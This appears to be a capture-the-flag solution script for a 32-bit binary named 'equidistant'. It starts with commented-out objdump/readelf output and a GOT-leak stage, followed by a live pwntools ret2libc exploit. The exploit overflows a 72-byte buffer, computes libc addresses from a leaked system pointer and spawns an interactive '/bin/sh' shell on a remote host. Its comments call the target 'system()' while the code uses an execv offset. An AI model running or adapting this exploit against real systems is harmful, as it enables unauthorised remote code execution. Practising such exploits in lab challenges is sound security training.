# tudor@tudor-Yoga-Pro-7-14APH8:~/Downloads$ objdump -d equidistant | grep puts
# 08049050 <puts@plt>:
#  80491d4:	e8 77 fe ff ff       	call   8049050 <puts@plt>
#  80491fc:	e8 4f fe ff ff       	call   8049050 <puts@plt>
# tudor@tudor-Yoga-Pro-7-14APH8:~/Downloads$ objdump -R equidistant | grep puts
# 0804c008 R_386_JUMP_SLOT   puts@GLIBC_2.0
# tudor@tudor-Yoga-Pro-7-14APH8:~/Downloads$ readelf -r equidistant | grep puts
# 0804c008  00000307 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
# tudor@tudor-Yoga-Pro-7-14APH8:~/Downloads$

# from pwn import *

# host = "10.213.0.102"
# port = "30317"
# context.arch = 'i386'

# puts_plt = 0x08049050  # Code to CALL puts
# puts_got = 0x0804c008  # Address WHERE the real puts address is stored

# p = remote(host, port)

# # Get system leak
# p.recvuntil(b"System addr: ")
# system_addr = int(p.recvline().strip(), 16)

# # Exploit
# p.recvuntil(b"Give me your name")

# # Stack after overflow:
# # [72 bytes padding][4 bytes EBP][puts_plt][return][arg]
# payload = b"A" * 72          # Fill buffer
# payload += b"B" * 4          # Saved EBP
# payload += p32(puts_plt)     # Return to puts@plt (calls puts)
# payload += b"CCCC"           # Fake return address (will crash after)
# payload += p32(puts_got)     # Argument to puts: address of GOT entry

# p.sendline(payload)

# # Receive output
# response = p.recvall(timeout=2)

# # Parse the leaked puts address
# #for processing: uts:   b'\nBye!\n\xd0\xde\xd7\xf7 \xcc\xd5\xf7\n'
# idx = response.index(b"Bye!\n") + 5

# puts_addr = u32(response[idx:idx+4])

# print(f"\n[+] System: {hex(system_addr)}")
# print(f"[+] Puts:   {hex(puts_addr)}")


# p.close()

from pwn import *

host = "10.213.0.102"
port = "52393"
context.arch = 'i386'

p = remote(host, port)

# Get system leak
p.recvuntil(b"System addr: ")
system_addr = int(p.recvline().strip(), 16)

systemOffset = 0x4c920
libc_base_system = system_addr - systemOffset
libc_str_bin_sh = 0x1b5faa
libc_execv = 0x000e03b0

str_bin_sh = libc_base_system + libc_str_bin_sh
execv = libc_base_system + libc_execv


p.recvuntil(b"Give me your name")

# Call system("/bin/sh")
payload = b"A" * 72
payload += b"B" * 4
payload += p32(execv)     # system()
payload += p32(0xdeadbeef)      # fake return address
payload += p32(str_bin_sh)      # "/bin/sh"

p.sendline(payload)

print("[+] Shell spawned!")
p.interactive()



p.close()